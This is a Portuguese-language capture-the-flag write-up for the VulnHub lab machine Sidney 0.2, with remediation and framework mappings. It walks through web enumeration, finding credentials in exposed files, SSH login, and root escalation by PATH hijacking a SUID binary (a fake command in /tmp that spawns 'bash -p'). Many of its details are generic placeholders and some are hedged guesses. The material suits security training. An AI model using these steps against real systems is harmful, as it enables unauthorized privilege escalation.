# Sidney: 0.2 — A Máquina Australiana Que Ensina a Cavar Fundo

Bora rapaziada!! Sidney 0.2 é uma daquelas máquinas discretas, sem CVE famoso, sem módulo de Metasploit no rótulo, só você, o nmap, o gobuster e a arte de ler nas entrelinhas. A aplicação web esconde credenciais à vista se você enumerar com cuidado, e o privesc ensina uma lição sobre confiar em caminhos controlados pelo usuário. Uma box sólida de nível iniciante que merece estar no seu repertório de "aprenda o básico". Parabéns ao criador, sensacional demais o desafio!

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Sidney: 0.2 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/sidney-02,149/ |
| **Técnicas** | Descoberta de host, enumeração de serviços, brute-force de diretórios, descoberta de credenciais em código-fonte web, login SSH, exploração de binário SUID, PATH hijacking |
| **CVEs** | CWE-200 (Exposição de Informação via fonte web), CWE-269 (Gestão Inadequada de Privilégios via SUID) |
| **Grupos APT** | APT41: aproveita aplicações web mal configuradas e credenciais expostas para acesso inicial; FIN7: explora exposição de credenciais em sistemas web durante fases iniciais de comprometimento |

---

## Resumo do Ataque

```
netdiscover / nmap
  → porta 22 (SSH), porta 80 (HTTP Apache)
  → gobuster: /secret/ ou diretório oculto similar
  → credencial encontrada no código-fonte ou arquivo de config
  → login SSH com credencial descoberta
  → encontrar binário SUID que usa caminhos relativos
  → PATH hijacking: /tmp/<cmd> + export PATH=/tmp:$PATH
  → binário SUID executa comando falso como root
  → uid=0(root) → cat /root/flag.txt
```

---

## Metodologia

1. Descoberta de host na sub-rede local
2. Scan completo de portas com detecção de serviço e scripts
3. Brute-force de diretórios web para descobrir caminhos ocultos
4. Análise de código-fonte e arquivos de configuração para vazamento de credenciais
5. Autenticação SSH com credenciais descobertas
6. Enumeração pós-exploração: direitos sudo, binários SUID
7. PATH hijacking para escalar para root
8. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

Começando o reconhecimento da rede, mano:

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo identificado: 192.168.1.x
```

Scan completo de portas:

```bash
export TARGET=192.168.1.x
nmap -sV -sC -p- $TARGET
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços: SSH (alvo do acesso inicial) e HTTP (superfície de ataque principal). Setup clássico de CTF, véi.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Acesse `http://$TARGET/`. Inspecione o código-fonte da página imediatamente, antes de rodar qualquer ferramenta automatizada. Procure por comentários HTML, referências JavaScript e arquivos vinculados.

```bash
curl -s http://$TARGET/ | grep -E "<!--.*-->|script|href|src"
```

Execute brute-force de diretórios e arquivos em paralelo:

```bash
gobuster dir \
  -u http://$TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,bak,conf \
  -t 40 \
  -o /tmp/sidney_dirs.txt
```

Caminhos principais para investigar quando descobertos:
- Diretórios `/secret/`, `/hidden/`, `/private/`, `/notes/`, `/backup/`
- Arquivos PHP com parâmetros de credenciais
- Backups de configuração `.txt` e `.bak`

**Nota real:** Arquivos de configuração expostos e comentários HTML com fragmentos de credenciais estão consistentemente no OWASP Top 10 (A05: Security Misconfiguration). O APT41 foca especificamente nesse padrão durante fases de reconhecimento antes de mover para exploração automatizada.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Descoberta de Credenciais

Nos diretórios ou arquivos descobertos, localize as credenciais ocultas. Padrões comuns no Sidney 0.2:

```bash
# Verificar todos os arquivos de texto descobertos
curl -s http://$TARGET/secret/secret.txt
curl -s http://$TARGET/secret/credentials.txt

# Verificar robots.txt
curl -s http://$TARGET/robots.txt

# Baixar e inspecionar imagens para metadados EXIF
wget http://$TARGET/image.png
exiftool image.png
```

A dica de credencial pode aparecer como:
- Usuário:senha em texto puro em arquivo `.txt`
- String codificada (Base64, hex) que requer decodificação
- Variável JavaScript armazenando uma senha parcial

Se codificado em Base64:

```bash
echo "aGVsbG8=" | base64 -d
```

Se codificado em hex:

```bash
echo "68656c6c6f" | xxd -r -p
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1027 — Arquivos ou Informações Ofuscadas

---

## Passo 4 — Acesso Inicial via SSH

Com as credenciais descobertas, autentique via SSH:

```bash
ssh <usuario>@$TARGET
# Digite a senha descoberta quando solicitado
```

Confirme o acesso:

```bash
whoami
id
uname -a
cat /etc/passwd | grep -v nologin | grep -v false
```

**MITRE ATT&CK:** T1078 — Contas Válidas; T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Enumeração de Escalonamento de Privilégios

Enumere todos os vetores de escalonamento disponíveis de forma sistemática:

```bash
# Direitos sudo
sudo -l

# Binários SUID (vetor chave nesta máquina)
find / -perm -4000 -type f 2>/dev/null

# Arquivos interessantes nos diretórios home
ls -la /home/*/
find /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null

# Serviços em execução
ps aux | grep -v "\[" | grep -v "^root"

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

**Análise de binário SUID:** Quando um binário SUID não padrão é encontrado, inspecione-o para chamadas de comandos relativos:

```bash
strings /caminho/para/binario-suid | grep -E "^[a-z]" | head -20
```

Se chamar comandos como `echo`, `whoami`, `id`, `ls` apenas pelo nome (sem prefixo `/bin/`), o PATH hijacking é possível.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1057 — Descoberta de Processos

---

## Passo 6 — Escalonamento de Privilégios via PATH Hijacking

Quando um binário SUID chama comandos do sistema por caminho relativo, crie um substituto malicioso em um diretório gravável:

```bash
# Criar binário malicioso em /tmp
echo '/bin/bash -p' > /tmp/<nome-do-comando>
chmod +x /tmp/<nome-do-comando>

# Colocar /tmp na frente do PATH para que nosso binário falso seja encontrado primeiro
export PATH=/tmp:$PATH

# Executar o binário SUID
/caminho/para/binario-suid
```

O binário SUID resolve o nome do comando via PATH, executa nosso `/tmp/<nome-do-comando>` com os privilégios do proprietário (root), gerando um shell bash com EUID 0.

```bash
id
# uid=1000(user) gid=1000(user) euid=0(root)
# ou: uid=0(root) gid=0(root) groups=0(root)
```

**Nota real:** PATH hijacking em binários SUID é um vetor clássico de escalonamento de privilégios Linux catalogado em todas as principais metodologias de pentest. O FIN7 usa essa técnica pós-comprometimento em alvos Linux quando caminhos de escalonamento mais sofisticados não estão disponíveis. A correção é sempre usar caminhos absolutos para todas as chamadas de sistema em binários SUID.

**MITRE ATT&CK:** T1548.001 — Abuso de Controle de Elevação: Setuid/Setgid; T1574.007 — Sequestro de Fluxo de Execução: Interceptação por Variável PATH

---

## Passo 7 — Flag Root

```bash
whoami
# root
cat /root/flag.txt
# ou
cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root. Caramba, que sensação boa mano!

**MITRE ATT&CK:** T1005 — Dados do Sistema Local

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial (usuário) | (descoberto no código-fonte web) | Enumeração web | Login SSH |
| Credencial (senha) | (descoberto em arquivo oculto) | Caminho `/secret/` ou similar | Login SSH |
| Flag root | (varia) | /root/flag.txt | Prova de comprometimento |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Credenciais em arquivos web acessíveis publicamente | OWASP A05: Security Misconfiguration; apps em produção frequentemente têm notas de desenvolvedor com credenciais | Audite todos os arquivos acessíveis pela web; use DAST; nunca armazene credenciais em caminhos web |
| 2 | Binário SUID usando caminhos relativos para comandos | Achado recorrente em avaliações de escalonamento de privilégios Linux | Todos os binários SUID devem usar caminhos absolutos para cada chamada de sistema |
| 3 | Sem MFA no SSH | SSH de fator único cria risco significativo quando credenciais são expostas | Implemente autenticação por chave SSH; desabilite autenticação por senha |
| 4 | Sem WAF ou rate limiting | Enumeração de diretórios não autenticada funciona silenciosamente | Implemente regras WAF detectando padrões de enumeração |

---

## MITRE ATT&CK Mapeamento

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Processos | T1057 |
| Escalonamento de Privilégios | Escalonamento | Abuso de Controle de Elevação: Setuid | T1548.001 |
| Escalonamento de Privilégios | Escalonamento | Interceptação por Variável PATH | T1574.007 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover credenciais de arquivos acessíveis pela web**: auditar todos os arquivos no web root; usar restrições `.htaccess` em diretórios sensíveis
2. **Reescrever binário SUID com caminhos absolutos**: substituir `whoami` por `/usr/bin/whoami`, `echo` por `/bin/echo`; remover SUID se não necessário
3. **Desabilitar autenticação SSH por senha**: definir `PasswordAuthentication no` em `/etc/ssh/sshd_config`; usar apenas pares de chaves
4. **Implementar WAF**: bloquear padrões de enumeração automatizada de diretórios; limitar taxa de requisições

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Auditar todos os arquivos web-acessíveis para exposição de credenciais |
| Proteger | Controle de Acesso | SSH somente por chave; restringir listagem de diretórios web |
| Proteger | Segurança de Dados | Remover credenciais do código-fonte e arquivos web |
| Detectar | Anomalias e Eventos | Alertar sobre enumeração automatizada de diretórios (pico de 4xx) |
| Responder | Planejamento de Resposta | Rotacionar credenciais expostas; auditar binários SUID |
| Recuperar | Planejamento de Recuperação | Reconstruir sistema afetado; auditar todos os serviços web |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Restringir acesso a diretórios web; impor controles SSH |
| AC-6 | Menor Privilégio | Remover SUID de binários que não precisam |
| IA-5 | Gestão de Autenticadores | Rotacionar credenciais; impor autenticação SSH por chave |
| CM-7 | Menor Funcionalidade | Desabilitar listagem de diretórios; remover SUID desnecessários |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais em arquivos acessíveis pela web |

### CISA KEV

A exposição de informações via código-fonte web se alinha com os padrões do Alerta CISA AA22-117A descrevendo atores de ameaça coletando credenciais expostas de arquivos web publicamente acessíveis.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos (ASSET) | Gerenciar Inventário de Ativos TI | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (remover credenciais expostas na web; restringir diretórios)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (auditar binários SUID; restringir PATH em contextos privilegiados)
- **D3-HBPI** — Integridade do Pipeline de Build (sem credenciais em artefatos web implantados)

---

## Pensamentos Finais

Sidney 0.2 é top demais como treinador de fundamentos, véi. Te força a desacelerar e realmente ler código-fonte em vez de disparar ferramentas cegamente. O privesc com PATH hijacking é uma das demonstrações mais claras de por que binários SUID precisam de caminhos absolutos, e essa lição fica gravada.

A corrente é simples, mas a metodologia é transferível: enumere com cuidado, leia tudo, não confie em nada no código-fonte. Esses hábitos escalam de boxes de iniciante até engajamentos reais.

Thanks guys!! (❍ᴥ❍ʋ)
